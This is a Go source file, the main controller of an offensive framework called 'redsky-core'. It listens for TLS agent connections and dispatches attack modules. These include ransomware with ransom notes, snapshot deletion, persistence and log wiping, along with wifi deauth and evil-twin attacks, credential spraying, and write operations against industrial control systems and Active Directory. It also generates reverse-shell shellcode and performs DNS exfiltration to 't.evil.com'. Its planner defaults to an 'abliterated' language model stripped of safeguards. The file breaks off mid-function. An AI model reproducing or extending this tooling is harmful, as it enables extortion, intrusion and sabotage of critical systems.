// redsky-core — the framework.
// Phase 5: persistent sessions + TUI.
package main

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	tea "github.com/charmbracelet/bubbletea"

	"github.com/sk666G/red-sky---arsenal/internal/capturer"
	"github.com/sk666G/red-sky---arsenal/internal/crypto"
	"github.com/sk666G/red-sky---arsenal/internal/dnsexfil"
	"github.com/sk666G/red-sky---arsenal/internal/planner"
	"github.com/sk666G/red-sky---arsenal/internal/plugin"
	"github.com/sk666G/red-sky---arsenal/internal/proto"
	"github.com/sk666G/red-sky---arsenal/internal/scanner"
	"github.com/sk666G/red-sky---arsenal/internal/session"
	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
	"github.com/sk666G/red-sky---arsenal/internal/tui"
	"github.com/sk666G/red-sky---arsenal/internal/tunnel"
	"github.com/sk666G/red-sky---arsenal/internal/wire"
	"github.com/sk666G/red-sky---arsenal/internal/wireless"
)

func main() {
	bind := flag.String("bind", "0.0.0.0", "listen address")
	port := flag.Int("port", 4444, "listen port")
	eng := flag.String("engagement", "default", "engagement name")
	pluginFlag := flag.String("plugin", "", "run a local plugin instead of listening")
	pluginTimeout := flag.Duration("plugin-timeout", 5*time.Minute, "plugin execution timeout")
	scanCIDR := flag.String("scan-cidr", "", "fast TCP scan: cidr or single ip")
	scanPorts := flag.String("scan-ports", "1-1024", "fast TCP scan: port spec")
	scanThreads := flag.Int("scan-threads", 2000, "fast TCP scan: worker count")
	scanTimeout := flag.Duration("scan-timeout", 2*time.Second, "fast TCP scan: dial timeout")
	headless := flag.Bool("headless", false, "log-only mode, no TUI")
	noLLM := flag.Bool("no-llm", false, "use rule-based planner instead of Ollama")
	llmModel := flag.String("llm-model", "huihui_ai/qwen2.5-abliterate:14b", "Ollama model for planning")
	socksBind := flag.String("socks", "", "start a SOCKS5 listener on this address (e.g. 127.0.0.1:1080) that tunnels through the first connected agent")
	pcapIface := flag.String("pcap", "", "capture raw packets on the target interface (Linux agent only). Requires -pcap-out.")
	pcapOut := flag.String("pcap-out", "", "path to write the capture to (.pcap)")
	pcapDuration := flag.Duration("pcap-duration", 30*time.Second, "how long to capture")
	dnsBind := flag.String("dns-exfil", "", "bind an authoritative DNS listener for exfil (e.g. 0.0.0.0:5353)")
	dnsDomain := flag.String("dns-domain", "t.evil.com", "tunnel domain agents will query under")
	wlIface := flag.String("wireless", "", "capture 802.11 frames on the agent interface (Linux agent, root)")
	wlChannel := flag.Int("wireless-channel", 0, "set the wifi channel before capture (0 = leave as is)")
	wlOut := flag.String("wireless-out", "", "path to write the capture to (.pcap)")
	wlDuration := flag.Duration("wireless-duration", 30*time.Second, "how long to capture")
	deauthBSSID := flag.String("deauth-bssid", "", "802.11 deauth: target AP MAC (spoofed as source)")
	deauthClient := flag.String("deauth-client", "ff:ff:ff:ff:ff:ff", "802.11 deauth: target client MAC (broadcast default)")
	deauthReason := flag.Int("deauth-reason", 7, "802.11 deauth: reason code")
	deauthBurst := flag.Int("deauth-burst", 3, "802.11 deauth: frames per interval")
	deauthInterval := flag.Duration("deauth-interval", 0, "802.11 deauth: delay between bursts (0 = flood)")
	deauthDuration := flag.Duration("deauth-duration", 10*time.Second, "802.11 deauth: total run time")
	cryptoRoot := flag.String("crypto-root", "", "crypto_malware: directory on the target to encrypt")
	cryptoPub := flag.String("crypto-pub", "", "crypto_malware: operator RSA public key PEM (required)")
	cryptoKeyID := flag.Uint("crypto-key-id", 0, "crypto_malware: key ring id stored in .rsky headers")
	cryptoVSS := flag.Bool("crypto-vss", false, "crypto_malware: kill VSS / snapshots before encrypting")
	cryptoNote := flag.Bool("crypto-note", false, "crypto_malware: drop ransom note in hit directories")
	cryptoNoteEmail := flag.String("crypto-note-email", "", "ransom note: contact email")
	cryptoNoteAddr := flag.String("crypto-note-address", "", "ransom note: payment address")
	cryptoNotePrice := flag.String("crypto-note-price", "", "ransom note: price (e.g. 0.05 XMR)")
	cryptoDryRun := flag.Bool("crypto-dry-run", false, "crypto_malware: enumerate only, write nothing")
	cryptoPersist := flag.Bool("crypto-persist", false, "crypto_malware: install persistence after encryption")
	cryptoPersistName := flag.String("crypto-persist-name", "system-update", "persistence task/unit name")
	cryptoPersistBoot := flag.Bool("crypto-persist-boot", false, "persist on system boot (SYSTEM/systemd)")
	cryptoWallpaper := flag.Bool("crypto-wallpaper", false, "crypto_malware: swap desktop wallpaper")
	cryptoWallpaperPath := flag.String("crypto-wallpaper-path", "", "path to wallpaper image")
	cryptoLogScrub := flag.Bool("crypto-log-scrub", false, "crypto_malware: wipe OS event/auth logs")
	iotCredsHost := flag.String("iotcreds", "", "iot default-creds spray: target ip[:port]")
	iotCredsProto := flag.String("iotcreds-proto", "http", "iot spray protocol: http|https|telnet|ssh")
	iotCredsPath := flag.String("iotcreds-path", "/", "iot spray: HTTP request path")
	iotCredsTimeout := flag.Int("iotcreds-timeout", 6, "iot spray: per-attempt timeout (seconds)")
	iotCredsFirst := flag.Bool("iotcreds-first", false, "iot spray: stop after first hit per host")
	icsHost := flag.String("ics", "", "ics operation: target ip[:port]")
	icsProto := flag.String("ics-proto", "modbus", "ics protocol: modbus|s7|dnp3")
	icsAction := flag.String("ics-action", "info", "ics action: scan|read|write|dump|info|integrity|poll")
	icsUnit := flag.Uint("ics-unit", 1, "modbus unit id")
	icsFunc := flag.Uint("ics-func", 3, "modbus function code (0x01-0x10)")
	icsStart := flag.Uint("ics-start", 0, "start address / register / db byte offset")
	icsCount := flag.Uint("ics-count", 16, "read count")
	icsValue := flag.Uint("ics-value", 0, "single-register write value")
	icsArea := flag.Uint("ics-area", 0x83, "s7 area (0x81 input, 0x82 output, 0x83 merker, 0x84 db)")
	icsDB := flag.Uint("ics-db", 1, "s7 db number")
	icsData := flag.String("ics-data", "", "hex bytes to write (s7 write, modbus multi-reg not yet)")
	icsDest := flag.Uint("ics-dest", 1, "dnp3 outstation address")
	icsSrc := flag.Uint("ics-src", 100, "dnp3 master address")
	icsClass := flag.Uint("ics-class", 0, "dnp3 class 0..3")
	icsObjType := flag.Uint("ics-obj-type", 0, "bacnet object type")
	icsObjInstance := flag.Uint("ics-obj-instance", 0, "bacnet object instance")
	icsPropertyID := flag.Uint("ics-property", 85, "bacnet property id (85 = present-value)")
	icsTag := flag.String("ics-tag", "", "enip: tag name")
	icsDataType := flag.Uint("ics-datatype", 0xC4, "enip: CIP data type (0xC4=REAL, 0xC3=DINT)")
	cloudAction := flag.String("cloud", "", "cloud action: probe|chain|identity|users|roles|simulate|driver")
	cloudProvider := flag.String("cloud-provider", "aws", "cloud provider: aws|gcp|azure (for probe)")
	cloudKey := flag.String("cloud-key", "", "aws access key id")
	cloudSecret := flag.String("cloud-secret", "", "aws secret access key")
	cloudToken := flag.String("cloud-token", "", "aws session token")
	cloudRegion := flag.String("cloud-region", "us-east-1", "aws region")
	cloudArn := flag.String("cloud-arn", "", "policy source arn (for simulate)")
	cloudDriver := flag.String("cloud-driver", "", "privesc driver: create_access_key|create_policy_version|...")
	cloudUser := flag.String("cloud-user", "", "target user (driver)")
	cloudGroup := flag.String("cloud-group", "", "target group (driver)")
	cloudPolicyArn := flag.String("cloud-policy-arn", "", "policy arn (driver)")
	cloudRoleArn := flag.String("cloud-role-arn", "", "role arn (assume_role)")
	cryptoOp := flag.String("crypto-op", "", "cryptogo op: derive|brainwallet|hash_crack|hash_id|java_recover|win_brute|mt_recover")
	cryptoPriv := flag.String("crypto-priv", "", "priv hex (derive)")
	cryptoPhrase := flag.String("crypto-phrase", "", "passphrase (brainwallet)")
	cryptoAlgo := flag.String("crypto-algo", "md5", "hash algo: md5|sha1|sha224|sha256|sha384|sha512|ntlm")
	cryptoHash := flag.String("crypto-hash", "", "target hash (hash_crack/hash_id)")
	cryptoWordlist := flag.String("crypto-wordlist", "", "wordlist file (hash_crack)")
	cryptoJavaA := flag.Uint("crypto-java-a", 0, "java.util.Random first nextInt")
	cryptoJavaB := flag.Uint("crypto-java-b", 0, "java.util.Random second nextInt")
	cryptoJavaN := flag.Int("crypto-java-n", 10, "next ints to predict")
	cryptoWinFirst := flag.Uint("crypto-win-first", 0, "windows CRT first output (15 bits)")
	cryptoWinLo := flag.Uint("crypto-win-lo", 0, "seed range lo")
	cryptoWinHi := flag.Uint("crypto-win-hi", 0, "seed range hi (default 2^24)")
	socialAction := flag.String("social", "", "social action: username|gravatar|subdomains")
	socialUser := flag.String("social-user", "", "handle (username)")
	socialEmail := flag.String("social-email", "", "email (gravatar)")
	socialDomain := flag.String("social-domain", "", "domain (subdomains)")
	socialThreads := flag.Int("social-threads", 30, "subdomain brute threads")
	webSSRF := flag.Bool("webssrf", false, "run the SSRF probe sweep on the first agent")
	webSSRFThreads := flag.Int("webssrf-threads", 5, "probe concurrency")
	webSSRFURL := flag.String("webssrf-url", "", "single URL to probe (overrides default set)")
	webSSRFMethod := flag.String("webssrf-method", "GET", "method for the single-URL probe")
	webSSTI := flag.String("webssti", "", "render SSTI payloads: pass engine (jinja2|twig|freemarker|velocity|smarty|mako|pebble|erb|tornado) or 'all'")
	webSSTICmd := flag.String("webssti-cmd", "id", "command to embed in payloads")
	webSSTIFPs := flag.Bool("webssti-fingerprints", false, "list fingerprint probes instead of payloads")
	webXXE := flag.String("webxxe", "", "render XXE payloads for a kind: in-band|oob|ssrf|dos|all")
	webXXEFile := flag.String("webxxe-file", "/etc/passwd", "file path for in-band payloads")
	webXXEURL := flag.String("webxxe-url", "http://169.254.169.254/latest/meta-data/", "URL for SSRF payloads")
	webXXEAttacker := flag.String("webxxe-attacker", "attacker.example", "attacker host for OOB callbacks")
	webXXEDefaults := flag.Bool("webxxe-defaults", false, "sweep the default file + URL list")
	webXSS := flag.String("webxss", "", "render XSS payloads for a context: html|attribute|url|script|css|dom|jsonp|markdown|all")
	webXSSJS := flag.String("webxss-js", "alert(1)", "JS body to substitute into {JS}")
	webXSSFPs := flag.Bool("webxss-fingerprints", false, "list framework fingerprint markers instead")
	adEnum := flag.String("adenum", "", "AD enumeration action: rootdse|domain|users|groups|computers|gpos|trusts|asrep|kerberoast|unconstrained|pwdnotreq|laps|adcs")
	adHost := flag.String("ad-host", "", "domain controller ip/hostname")
	adPort := flag.Int("ad-port", 389, "LDAP port (389 or 636)")
	adTLS := flag.Bool("ad-tls", false, "use LDAPS")
	adBindDN := flag.String("ad-bind-dn", "", "LDAP bind DN")
	adBindPW := flag.String("ad-bind-pw", "", "LDAP bind password")
	adBaseDN := flag.String("ad-base-dn", "", "search base (auto via RootDSE if empty)")
	adWrite := flag.String("ad-write", "", "write driver: add_user|add_to_group|remove_from_group|set_attr|del_attr|add_spn|remove_spn|set_uac|add_uac|set_dontpreauth|clear_dontpreauth|set_primary_group|modify_pw|set_rbcd")
	adTargetDN := flag.String("ad-target-dn", "", "target DN (write)")
	adGroupDN := flag.String("ad-group-dn", "", "group DN (add_to_group)")
	adAttrName := flag.String("ad-attr-name", "", "attribute name (set_attr / add_user)")
	adAttrValue := flag.String("ad-attr-value", "", "attribute value (set_attr)")
	adPassword := flag.String("ad-password", "", "password (add_user / modify_pw)")
	adUACValue := flag.Uint("ad-uac-value", 0, "UAC value (set_uac / add_uac flag)")
	adUACCurrent := flag.Uint("ad-uac-current", 0, "current UAC value (add_uac / dontpreauth)")
	adSPN := flag.String("ad-spn", "", "SPN (add_spn / remove_spn)")
	adPrimaryGID := flag.Uint("ad-primary-gid", 0, "primaryGroupID (set_primary_group)")
	adEncodedSD := flag.String("ad-encoded-sd", "", "encoded security descriptor (set_rbcd)")
	scArch := flag.String("shellcode-arch", "linux_x64", "shellcode target: linux_x64|linux_x86|windows_x64|macos_x64")
	scKind := flag.String("shellcode-kind", "exec_sh", "shellcode kind: exec_sh|reverse_sh|exec_cmd")
	scEncode := flag.String("shellcode-encode", "none", "encoder: none|xor|rot13|null_free|chunked_xor|base64|uuid|ipv4")
	scKey := flag.Uint("shellcode-key", 0, "encoder key (xor / rot)")
	scIP := flag.String("shellcode-ip", "127.0.0.1", "reverse shell target IP")
	scPort := flag.Uint("shellcode-port", 4444, "reverse shell target port")
	scWinExec := flag.Uint64("shellcode-winexec", 0, "windows_x64 WinExec address (from PEB walk)")
	hostInfo := flag.Bool("hostinfo", false, "ask the first agent for its local interface picture")
	vmDetect := flag.Bool("vmdetect", false, "ask the first agent to run VM/sandbox detection")
	antiForen := flag.String("antiforen", "", "anti-forensics: logstop|history|secure_delete|timestamp|all")
	antiForenPaths := flag.String("antiforen-paths", "", "comma-separated paths (secure_delete / timestamp / all)")
	antiForenDry := flag.Bool("antiforen-dry", false, "print actions without executing")
	mailTrace := flag.String("mailtrace", "", "analyze an email: pass .eml path, or @FILE for a raw header blob")
	geoIP := flag.String("geoip", "", "classify IPs: comma-separated list")
	proxyChain := flag.String("proxy-chain", "", "SOCKS5 chain spec: host1:port1,host2:port2,...")
	proxyChainTarget := flag.String("proxy-chain-target", "", "final target host:port (optional)")
	proxyChainTimeout := flag.Int("proxy-chain-timeout", 15, "per-hop timeout (seconds)")
	csintAction := flag.String("csint", "", "content-source intel: index|search|list")
	csintRoot := flag.String("csint-root", "", "directory to index")
	csintQuery := flag.String("csint-query", "", "search query")
	csintIndexPath := flag.String("csint-index", "", "index file path (default: <root>/.rs_csint.json)")
	btAction := flag.String("bluetooth", "", "bluetooth action: scan|info")
	btAddress := flag.String("bluetooth-address", "", "device MAC (info)")
	btDuration := flag.Int("bluetooth-duration", 10, "scan duration (seconds)")
	droneAction := flag.String("drone", "", "MAVLink action: listen|heartbeat|command|mode|manual")
	droneHost := flag.String("drone-host", "", "UAV ip")
	dronePort := flag.Int("drone-port", 14550, "MAVLink udp port")
	droneSysID := flag.Uint("drone-sysid", 255, "mavlink system id")
	droneCompID := flag.Uint("drone-compid", 190, "mavlink component id")
	droneTargetSys := flag.Uint("drone-target-sys", 1, "target system id")
	droneTargetComp := flag.Uint("drone-target-comp", 1, "target component id")
	droneCommand := flag.Uint("drone-command", 0, "MAV_CMD id")
	droneListen := flag.Int("drone-listen", 10, "listen duration (seconds)")
	droneLat := flag.Float64("drone-lat", 0, "goto latitude")
	droneLon := flag.Float64("drone-lon", 0, "goto longitude")
	droneAlt := flag.Float64("drone-alt", 0, "goto altitude (meters)")
	droneV2 := flag.Bool("drone-v2", false, "use MAVLink v2 framing")
	droneSigKey := flag.String("drone-sig-key", "", "MAVLink v2 signing key (hex, 32 bytes)")
	droneLinkID := flag.Uint("drone-link-id", 0, "MAVLink v2 signing link id")
	cctvAction := flag.String("cctv", "", "cctv action: probe|find_path|scan_creds")
	cctvHost := flag.String("cctv-host", "", "camera host")
	cctvURL := flag.String("cctv-url", "", "full rtsp url")
	cctvUser := flag.String("cctv-user", "", "rtsp user")
	cctvPass := flag.String("cctv-pass", "", "rtsp password")
	cctvTimeout := flag.Int("cctv-timeout", 5, "per-request timeout (seconds)")
	reportTitle := flag.String("report", "", "generate a report: pass title (empty = skip)")
	reportOperator := flag.String("report-operator", "", "operator name")
	reportEngagement := flag.String("report-engagement", "", "engagement name")
	reportSrcDir := flag.String("report-dir", "", "directory to walk for JSON sources")
	reportFindings := flag.String("report-findings", "", "path to a JSON array of findings")
	reportOut := flag.String("report-out", "", "output path (default: /tmp/redsky_report_<ts>.md)")
	webReqURL := flag.String("webreq", "", "send a raw HTTP request via the first agent")
	webReqMethod := flag.String("webreq-method", "GET", "HTTP method")
	webReqBody := flag.String("webreq-body", "", "request body (string)")
	webReqTimeout := flag.Int("webreq-timeout", 15, "timeout (seconds)")
	webReqSkipTLS := flag.Bool("webreq-skip-tls", true, "skip TLS verification")
	workflowSteps := flag.String("workflow", "", "run recon workflow: comma-separated steps (or 'default')")
	workflowDry := flag.Bool("workflow-dry", false, "preview steps without executing")
	workflowCSInt := flag.String("workflow-csint-root", "", "directory to index (csint step)")
	workflowTitle := flag.String("workflow-report-title", "", "title for the final report step")
	pmkidIface := flag.String("pmkid", "", "802.11 PMKID harvest: monitor-mode iface")
	pmkidChannel := flag.Int("pmkid-channel", 0, "PMKID: set wifi channel before harvest")
	pmkidDuration := flag.Duration("pmkid-duration", 60*time.Second, "PMKID: total harvest run time")
	pmkidBSSID := flag.String("pmkid-bssid", "", "PMKID: only emit hits for this BSSID")
	pmkidOut := flag.String("pmkid-out", "", "PMKID: write hashcat lines to this file (append)")
	evilSSID := flag.String("evil-ssid", "", "evil twin: SSID to spoof")
	evilBSSID := flag.String("evil-bssid", "", "evil twin: BSSID to spoof (required)")
	evilIface := flag.String("evil-iface", "", "evil twin: monitor-mode iface (required)")
	evilChannel := flag.Int("evil-channel", 6, "evil twin: operating channel")
	evilBeacon := flag.Duration("evil-beacon", 100*time.Millisecond, "evil twin: beacon interval")
	evilDuration := flag.Duration("evil-duration", 60*time.Second, "evil twin: total run time")
	evilOut := flag.String("evil-out", "", "evil twin: append probe hits to this file")
	wpa3Iface := flag.String("wpa3", "", "WPA3 observe: monitor-mode iface")
	wpa3Channel := flag.Int("wpa3-channel", 0, "WPA3: set wifi channel before observe")
	wpa3Duration := flag.Duration("wpa3-duration", 60*time.Second, "WPA3: total observe run time")
	flag.Parse()

	if *pluginFlag != "" {
		runPlugin(*pluginFlag, *pluginTimeout)
		return
	}

	if *scanCIDR != "" {
		runScanner(*scanCIDR, *scanPorts, *scanThreads, *scanTimeout)
		return
	}

	root, _ := os.UserHomeDir()
	paths := rsTLS.Paths(filepath.Join(root, ".redsky"), *eng)
	if err := paths.EnsureCA([]string{"127.0.0.1", "localhost"}); err != nil {
		log.Fatalf("ensure CA: %v", err)
	}
	fp, err := paths.CAFingerprint()
	if err != nil {
		log.Fatalf("ca fingerprint: %v", err)
	}
	tlsCfg, err := paths.ServerTLSConfig()
	if err != nil {
		log.Fatalf("tls config: %v", err)
	}

	mgr := session.NewManager()

	addr := fmt.Sprintf("%s:%d", *bind, *port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("listen: %v", err)
	}
	tlsLn := rsTLS.NewTLSListener(ln, tlsCfg)

	fmt.Printf("redsky-core listening on %s (TLS)\n", addr)
	fmt.Printf("engagement dir: %s\n", paths.Dir)
	fmt.Printf("CA fingerprint: %s\n", fp)
	fmt.Printf("agent flag: -ca-fingerprint '%s'\n\n", fp)

	go acceptLoop(tlsLn, mgr)

	if *socksBind != "" {
		go startSocks(*socksBind, mgr)
	}

	if *wlIface != "" {
		if *wlOut == "" {
			log.Fatalf("-wireless requires -wireless-out")
		}
		go runWirelessCapture(mgr, *wlIface, *wlChannel, *wlOut, *wlDuration)
	}

	// deauth-bssid dispatch — fires when -deauth-bssid is set
	if *deauthBSSID != "" {
		if *wlIface == "" {
			log.Printf("[deauth] -wireless <iface> required")
		} else {
			dctx, dcancel := context.WithTimeout(context.Background(), *deauthDuration)
			derr := wireless.Deauth(dctx, wireless.DeauthOptions{
				Iface:    *wlIface,
				BSSID:    *deauthBSSID,
				Client:   *deauthClient,
				Reason:   uint16(*deauthReason),
				Burst:    *deauthBurst,
				Interval: *deauthInterval,
				Duration: *deauthDuration,
			})
			dcancel()
			if derr != nil {
				log.Printf("[deauth] %v", derr)
			}
		}
	}

	// pmkid dispatch — harvests PMKID from EAPOL msg 1, writes hashcat lines
	if *pmkidIface != "" {
		pctx, pcancel := context.WithTimeout(context.Background(), *pmkidDuration)
		var hitsFile *os.File
		if *pmkidOut != "" {
			f, err := os.OpenFile(*pmkidOut, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err != nil {
				log.Printf("[pmkid] open %s: %v", *pmkidOut, err)
			} else {
				hitsFile = f
				defer hitsFile.Close()
			}
		}
		onHit := func(h wireless.PMKIDHit) {
			line := h.HashcatLine()
			log.Printf("[pmkid] %s bssid=%s sta=%s pmkid=%x",
				h.TS.Format("15:04:05"), h.BSSID, h.Station, h.PMKID)
			if hitsFile != nil {
				fmt.Fprintln(hitsFile, line)
				hitsFile.Sync()
			}
		}
		if err := wireless.Harvest(pctx, wireless.PMKIDOptions{
			Iface:       *pmkidIface,
			Channel:     *pmkidChannel,
			Duration:    *pmkidDuration,
			FilterBSSID: *pmkidBSSID,
		}, onHit); err != nil {
			log.Printf("[pmkid] %v", err)
		}
		pcancel()
	}

	// evil_twin dispatch — rogue AP beacons + probe harvest
	if *evilSSID != "" {
		if *evilIface == "" || *evilBSSID == "" {
			log.Printf("[evil_twin] -evil-iface and -evil-bssid required")
		} else {
			var probeFile *os.File
			if *evilOut != "" {
				f, err := os.OpenFile(*evilOut, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err != nil {
					log.Printf("[evil_twin] open %s: %v", *evilOut, err)
				} else {
					probeFile = f
					defer probeFile.Close()
				}
			}
			ectx, ecancel := context.WithTimeout(context.Background(), *evilDuration)
			onProbe := func(h wireless.ProbeHit) {
				line := fmt.Sprintf("%s client=%s ssid=%q rssi=%d",
					h.TS.Format("15:04:05"), h.Client, h.SSID, h.RSSIsign)
				log.Printf("[evil_twin] probe %s", line)
				if probeFile != nil {
					fmt.Fprintln(probeFile, line)
					probeFile.Sync()
				}
			}
			if err := wireless.EvilTwin(ectx, wireless.EvilTwinOptions{
				Iface:       *evilIface,
				SSID:        *evilSSID,
				BSSID:       *evilBSSID,
				Channel:     *evilChannel,
				BeaconEvery: *evilBeacon,
				Duration:    *evilDuration,
			}, onProbe); err != nil {
				log.Printf("[evil_twin] %v", err)
			}
			ecancel()
		}
	}

	// wpa3 dispatch — SAE observation + transition-mode detection
	if *wpa3Iface != "" {
		wctx, wcancel := context.WithTimeout(context.Background(), *wpa3Duration)
		onSAE := func(h wireless.SAEHit) {
			kind := "commit"
			if h.Seq == 2 {
				kind = "confirm"
			}
			log.Printf("[wpa3] sae %s bssid=%s sta=%s group=%d",
				kind, h.BSSID, h.Station, h.GroupID)
		}
		onTransition := func(h wireless.TransitionHit) {
			log.Printf("[wpa3] transition-mode ap bssid=%s ssid=%q — chain: deauth + pmkid",
				h.BSSID, h.SSID)
		}
		if err := wireless.WPA3(wctx, wireless.WPA3Options{
			Iface:    *wpa3Iface,
			Channel:  *wpa3Channel,
			Duration: *wpa3Duration,
		}, onSAE, onTransition); err != nil {
			log.Printf("[wpa3] %v", err)
		}
		wcancel()
	}

	// crypto dispatch — ransomware stage on the first connected agent
	if *cryptoRoot != "" {
		if *cryptoPub == "" {
			log.Printf("[crypto] -crypto-pub <path> required")
		} else if *cryptoNote && (*cryptoNoteEmail == "" || *cryptoNoteAddr == "" || *cryptoNotePrice == "") {
			log.Printf("[crypto] -crypto-note requires -crypto-note-email, -crypto-note-address, -crypto-note-price")
		} else {
			go runCryptoDispatch(mgr, cryptoDispatchArgs{
				Root:          *cryptoRoot,
				PubPath:       *cryptoPub,
				KeyID:         uint32(*cryptoKeyID),
				KillVSS:       *cryptoVSS,
				Note:          *cryptoNote,
				NoteEmail:     *cryptoNoteEmail,
				NoteAddr:      *cryptoNoteAddr,
				NotePrice:     *cryptoNotePrice,
				DryRun:        *cryptoDryRun,
				PostPersist:   *cryptoPersist,
				PersistName:   *cryptoPersistName,
				PersistOnBoot: *cryptoPersistBoot,
				PostWallpaper: *cryptoWallpaper,
				WallpaperPath: *cryptoWallpaperPath,
				PostLogScrub:  *cryptoLogScrub,
			})
		}
	}

	// iotcreds dispatch — default-credential spray against an IoT target
	if *iotCredsHost != "" {
		host := *iotCredsHost
		port := 0
		if i := strings.LastIndex(host, ":"); i > 0 {
			if p, err := strconv.Atoi(host[i+1:]); err == nil {
				port = p
				host = host[:i]
			}
		}
		go runIoTCredsDispatch(mgr, iotCredsArgs{
			Host:      host,
			Port:      port,
			Protocol:  *iotCredsProto,
			Path:      *iotCredsPath,
			Timeout:   *iotCredsTimeout,
			StopFirst: *iotCredsFirst,
		})
	}

	// ics dispatch — ICS protocol operations via the first agent
	if *icsHost != "" {
		host := *icsHost
		port := 0
		if i := strings.LastIndex(host, ":"); i > 0 {
			if p, err := strconv.Atoi(host[i+1:]); err == nil {
				port = p
				host = host[:i]
			}
		}
		var dataBytes []byte
		if *icsData != "" {
			if b, err := hexDecode(*icsData); err == nil {
				dataBytes = b
			} else {
				log.Printf("[ics] bad -ics-data hex: %v", err)
			}
		}
		go runIcsDispatch(mgr, icsArgs{
			Host:        host,
			Port:        port,
			Proto:       *icsProto,
			Action:      *icsAction,
			Unit:        uint8(*icsUnit),
			Func:        byte(*icsFunc),
			Start:       uint16(*icsStart),
			Count:       uint16(*icsCount),
			Value:       uint16(*icsValue),
			Area:        byte(*icsArea),
			DB:          uint16(*icsDB),
			Data:        dataBytes,
			Dest:        uint16(*icsDest),
			Src:         uint16(*icsSrc),
			Class:       uint8(*icsClass),
			ObjType:     uint16(*icsObjType),
			ObjInstance: uint32(*icsObjInstance),
			PropertyID:  uint16(*icsPropertyID),
			Tag:         *icsTag,
			DataType:    byte(*icsDataType),
		})
	}

	// cloud dispatch — cloud-provider ops via the first agent
	if *cloudAction != "" {
		go runCloudDispatch(mgr, cloudArgs{
			Action:    *cloudAction,
			Provider:  *cloudProvider,
			KeyID:     *cloudKey,
			Secret:    *cloudSecret,
			Token:     *cloudToken,
			Region:    *cloudRegion,
			Arn:       *cloudArn,
			Driver:    *cloudDriver,
			User:      *cloudUser,
			Group:     *cloudGroup,
			PolicyArn: *cloudPolicyArn,
			RoleArn:   *cloudRoleArn,
		})
	}

	// crypto op dispatch — cryptogo ops via the first agent
	if *cryptoOp != "" {
		go runCryptoOpDispatch(mgr, cryptoOpArgs{
			Op:       *cryptoOp,
			Priv:     *cryptoPriv,
			Phrase:   *cryptoPhrase,
			Algo:     *cryptoAlgo,
			Hash:     *cryptoHash,
			Wordlist: *cryptoWordlist,
			JavaA:    uint32(*cryptoJavaA),
			JavaB:    uint32(*cryptoJavaB),
			JavaN:    *cryptoJavaN,
			WinFirst: uint16(*cryptoWinFirst),
			WinLo:    uint32(*cryptoWinLo),
			WinHi:    uint32(*cryptoWinHi),
		})
	}

	// social dispatch — social-recon ops via the first agent
	if *socialAction != "" {
		go runSocialDispatch(mgr, socialArgs{
			Action:  *socialAction,
			User:    *socialUser,
			Email:   *socialEmail,
			Domain:  *socialDomain,
			Threads: *socialThreads,
		})
	}

	// webssrf dispatch — SSRF probe sweep via the first agent
	if *webSSRF {
		go runWebSSRFDispatch(mgr, webSSRFArgs{
			URL:     *webSSRFURL,
			Method:  *webSSRFMethod,
			Threads: *webSSRFThreads,
		})
	}

	// webssti dispatch — SSTI payload rendering via the first agent
	if *webSSTI != "" || *webSSTIFPs {
		go runWebSSTIDispatch(mgr, webSSTIArgs{
			Engine:  *webSSTI,
			Cmd:     *webSSTICmd,
			ListFPs: *webSSTIFPs,
		})
	}

	// webxxe dispatch — XXE payload rendering via the first agent
	if *webXXE != "" || *webXXEDefaults {
		go runWebXXEDispatch(mgr, webXXEArgs{
			Kind:     *webXXE,
			File:     *webXXEFile,
			URL:      *webXXEURL,
			Attacker: *webXXEAttacker,
			Defaults: *webXXEDefaults,
		})
	}

	// webxss dispatch — XSS payload rendering via the first agent
	if *webXSS != "" || *webXSSFPs {
		go runWebXSSDispatch(mgr, webXSSArgs{
			Context: *webXSS,
			JS:      *webXSSJS,
			FPs:     *webXSSFPs,
		})
	}

	// adenum dispatch — AD enumeration OR write via the first agent
	if *adEnum != "" || *adWrite != "" {
		go runAdEnumDispatch(mgr, adEnumArgs{
			Action:      *adEnum,
			Host:        *adHost,
			Port:        *adPort,
			TLS:         *adTLS,
			BindDN:      *adBindDN,
			BindPW:      *adBindPW,
			BaseDN:      *adBaseDN,
			WriteDriver: *adWrite,
			TargetDN:    *adTargetDN,
			GroupDN:     *adGroupDN,
			AttrName:    *adAttrName,
			AttrValue:   *adAttrValue,
			Password:    *adPassword,
			UACValue:    uint32(*adUACValue),
			UACCurrent:  uint32(*adUACCurrent),
			SPN:         *adSPN,
			PrimaryGID:  uint32(*adPrimaryGID),
			EncodedSD:   *adEncodedSD,
		})
	}

	// shellcode dispatch — generate + encode a stub on the agent
	if *scKind != "" {
		go runShellcodeDispatch(mgr, shellcodeArgs{
			Arch:    *scArch,
			Kind:    *scKind,
			Encode:  *scEncode,
			Key:     uint8(*scKey),
			IP:      *scIP,
			Port:    uint16(*scPort),
			WinExec: *scWinExec,
		})
	}

	// hostinfo dispatch — one-shot local recon on the first agent
	if *hostInfo {
		go runHostInfoDispatch(mgr)
	}

	// vmdetect dispatch — one-shot VM/sandbox check on the first agent
	if *vmDetect {
		go runVMDetectDispatch(mgr)
	}

	// antiforen dispatch — anti-forensics primitives on the first agent
	if *antiForen != "" {
		var paths []string
		if *antiForenPaths != "" {
			for _, p := range strings.Split(*antiForenPaths, ",") {
				p = strings.TrimSpace(p)
				if p != "" {
					paths = append(paths, p)
				}
			}
		}
		go runAntiForenDispatch(mgr, antiForenArgs{
			Action: *antiForen,
			Paths:  paths,
			DryRun: *antiForenDry,
		})
	}

	// mailtrace dispatch — parse email headers on the first agent
	if *mailTrace != "" {
		path := *mailTrace
		blob := ""
		if strings.HasPrefix(path, "@") {
			b, err := os.ReadFile(path[1:])
			if err == nil {
				blob = string(b)
				path = ""
			} else {
				log.Printf("[mailtrace] read blob: %v", err)
			}
		}
		go runMailTraceDispatch(mgr, mailTraceArgs{Path: path, Blob: blob})
	}

	// geoip dispatch — IP classification on the first agent
	if *geoIP != "" {
		var ips []string
		for _, ip := range strings.Split(*geoIP, ",") {
			ip = strings.TrimSpace(ip)
			if ip != "" {
				ips = append(ips, ip)
			}
		}
		go runGeoIPDispatch(mgr, ips)
	}

	// proxy chain dispatch — test a SOCKS5 chain on the first agent
	if *proxyChain != "" {
